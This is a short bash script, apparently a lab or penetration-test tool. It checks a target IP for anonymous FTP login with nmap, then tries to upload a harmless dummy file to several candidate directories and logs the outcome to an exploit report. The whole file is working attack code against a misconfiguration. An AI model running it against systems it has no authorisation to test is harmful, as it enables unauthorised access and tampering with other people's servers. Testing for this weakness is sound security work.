#!/bin/bash

# Check if IP address argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ip_address>"
    exit 1
fi

IP="$1"

# Create a report file
EXPLOIT_REPORT="exploit_report_for_${IP}.txt"
echo "Exploit Report for $IP" >"$EXPLOIT_REPORT"
echo "-----------------------------------------" >>"$EXPLOIT_REPORT"

# Step 1: Check for anonymous login using nmap
echo "Checking for anonymous login on $IP using nmap..." | tee -a "$EXPLOIT_REPORT"
nmap -p 21 --script=ftp-anon "$IP" -oN nmap_anon_check_$IP.txt
anon_result=$(grep "Anonymous FTP login allowed" nmap_anon_check_$IP.txt)

if [ -n "$anon_result" ]; then
    echo "Anonymous login allowed on $IP" | tee -a "$EXPLOIT_REPORT"

    # Step 2: Attempt to upload a file to potential writable directories
    echo "Checking for writable directories and injecting file..." | tee -a "$EXPLOIT_REPORT"

    # List of directories to try for file upload
    directories=("eddie_attack" "logs" "session_logs" "stress_tests" "version_data")

    # Attempt to upload a file to each directory
    for dir in "${directories[@]}"; do
        echo "Trying directory: $dir" | tee -a "$EXPLOIT_REPORT"

        # Create a dummy file to upload
        echo "Hello world from exploit test" >hello.txt

        # Attempt to upload file via FTP
        ftp -nv $IP <<END_FTP >>"$EXPLOIT_REPORT"
        user anonymous anonymous
        put hello.txt $dir/hello.txt
        quit
END_FTP

        rm hello.txt # Clean up the dummy file

        # Check if file was successfully uploaded
        if grep -q "226 Transfer complete" "$EXPLOIT_REPORT"; then
            echo "File uploaded successfully to $dir" | tee -a "$EXPLOIT_REPORT"
            break # Exit loop if successful
        fi
    done

else
    echo "Anonymous login not allowed on $IP. Exploitation not possible." | tee -a "$EXPLOIT_REPORT"
fi

# Cleanup intermediate files
rm nmap_anon_check_$IP.txt

echo "Exploitation script completed. Report saved to $EXPLOIT_REPORT."
